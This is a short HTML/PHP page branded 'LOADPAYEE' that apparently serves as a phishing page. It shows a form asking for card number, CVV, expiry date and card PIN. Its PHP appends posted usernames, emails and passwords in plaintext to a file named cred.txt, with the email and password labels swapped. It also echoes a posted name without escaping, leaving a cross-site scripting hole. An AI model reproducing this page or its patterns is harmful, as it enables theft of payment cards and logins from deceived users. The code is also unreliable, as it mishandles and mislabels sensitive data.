<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WELCOME TO LOADPAYEE</title>
</head>
<body>

    <p>Welcome <?php echo $_POST["name"]; ?></p><br>
    <h2 id="sign">WELCOME TO LOADPAYEE ONCE AGAIN</h2>
        <form action="submit.php" method="post">
            name: <input type="text" name="name1"><br><br>
            cardNumber: <input type="text" name="cardNumber"><br><br>
            CVV: <input type="text" name="CVV"><br><br>
            expiryDate: <input type="text" name="expiryDate"><br><br>
            cardPIN: <input type="text" name="cardPIN"><br><br>
            <input type="submit">
        </form>
            
    
        <?php
        $myfile = fopen("cred.txt", "a") or die("Unable to open file!");
        $x = $_POST["name"];
        $y = $_POST["password"];
        $z =$_POST["email"];
        
        fwrite($myfile, "username: $x\n");
        fwrite($myfile, "email: $y\n");
        fwrite($myfile, "password: $z\n");
        fwrite($myfile, "\n");
        fclose($myfile);
        ?>
</body>
</html>